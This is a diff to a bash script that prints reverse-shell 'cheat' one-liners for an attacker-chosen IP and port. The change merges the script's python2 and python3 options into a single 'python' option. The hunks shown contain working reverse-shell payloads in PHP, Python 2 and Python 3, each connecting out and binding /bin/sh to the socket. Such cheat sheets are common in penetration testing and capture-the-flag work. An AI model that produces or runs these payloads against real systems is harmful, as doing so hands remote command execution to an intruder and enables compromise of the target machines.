@@ -39,7 +39,7 @@ display_help () {
     echo -e "\033[1m SYNOPSIS \033[m"
     echo 
     echo -e "  $(basename $0) [ -i ip:port ] [ -l shell-type ]"
-    echo -e "  shell-type -l: bash, netcat|nc, java|jar, perl|pl, php, python2|py2, python3|py3, xterm"
+    echo -e "  shell-type -l: bash, netcat|nc, java|jar, perl|pl, php, python|py, xterm"
     echo "                                                                  "
 }
 
@@ -103,12 +103,11 @@ display_reverse_shell_cheat () {
                 echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [php]\033[m"
                 echo -e "\t\033[1mphp -r '"'$sock'"=fsockopen(\"$IP\","$PORT");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                 ;;
-            python | py2)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [python2]\033[m"
+            python | py)
+                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT:\033[m"
+                echo -e "\033[31m\033[1m [python2]\033[m"
                 echo -e  "\t\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
-                ;;
-            python3 | py3)
-                echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [python3]\033[m"
+                echo -e "\033[31m\033[1m [python3]\033[m"
                 echo -e  "\t\033[1mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[m"
                 ;;
             ruby | rb)
